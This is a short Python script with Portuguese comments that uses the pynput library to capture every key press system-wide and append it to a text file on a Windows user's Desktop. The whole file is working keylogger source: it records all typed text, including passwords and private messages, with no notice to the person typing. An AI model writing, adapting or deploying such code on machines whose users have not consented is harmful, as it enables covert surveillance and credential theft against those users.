from pynput.keyboard import Listener
import sys


logFile = r"C:\Users\marcelo\Desktop\keylog.txt"

def writeLog(key):

    teclas = {
	"Key.space": " ",
	"Key.shift_r": "",
	"Key.shift_l": "",
	"Key.enter": "\n",
	"Key.alt": "",
	"Key.esc": "",
	"Key.cmd": "",
	"Key.caps_lock": "",
	}


    #converter a tecla pressionada para string
    keydata = str(key)
        
    keydata = keydata.replace("'", "")

    for key in teclas:
        keydata = keydata.replace(key, teclas[key])

    try:
        arq = open(logFile)

    except FileNotFoundError:
        with open(logFile, "w") as arquivo:
            pass

    with open(logFile, "a") as arquivo:
        arquivo.write(keydata)

#abrir o Listener do teclado e escutar o evento on_press
#quando o evento on_press ocorrer, chamar a função writeLog
with Listener(on_press=writeLog) as listener:
    listener.join()

 